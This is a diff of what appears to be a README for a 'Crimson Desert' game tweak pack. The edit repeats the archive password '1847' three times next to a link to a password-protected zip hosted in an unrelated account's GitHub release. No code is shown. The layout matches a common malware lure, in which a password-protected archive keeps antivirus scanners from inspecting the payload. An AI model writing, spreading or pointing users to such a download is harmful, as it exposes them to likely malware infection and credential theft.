@@ -46,8 +46,9 @@ Unlock higher framerates, eliminate stutters, tweak graphics, customize your HUD
 🔽 Grab the full mod pack below — password-protected archive, ready to go.
 
 📦 [**Download**](https://github.com/PrideIndustrialHaul/Crimson-Desert-Tweak-Pack/releases/download/Latest/LastRelease_CD.zip))
-
-🔑 **🔑🔑:** `1847`
+**🔐🔐🔐** `1847`  **🔐🔐🔐**
+**🔐🔐🔐** `1847`  **🔐🔐🔐**
+**🔐🔐🔐** `1847`  **🔐🔐🔐**
 
 ---
 
